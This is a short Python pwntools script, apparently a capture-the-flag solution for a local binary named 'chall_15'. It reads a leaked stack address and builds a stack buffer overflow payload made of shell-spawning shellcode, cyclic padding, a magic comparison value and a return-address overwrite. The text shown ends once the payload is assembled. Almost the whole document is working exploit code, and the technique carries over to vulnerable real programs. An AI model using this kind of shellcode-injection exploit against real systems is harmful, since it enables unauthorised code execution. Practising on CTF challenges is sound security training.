from pwn import *
context.arch = "amd64"

# Stack executable, PIE enabled, full RelRO

p = process("./chall_15")

# Skipping puts
p.recvline()

# Grabbing leaked address
leaked_address = int(p.recvline().strip(), 16)

shellcode = asm(shellcraft.sh())

# We go all the way to the gets which is stored within var 120h, but we need room for shellcode and 
# we minus 8 for all of the comparisons, cause they start at var_8h, takes up 4 bytes of memory for the first var and 4 more for the 2nd var.
# house of ryan for the final 8
payload = shellcode + cyclic(0x120 - len(shellcode) - 0x8) + p64(0xb16b00b5deadd00d) + cyclic(0x8) + p64(leaked_address) 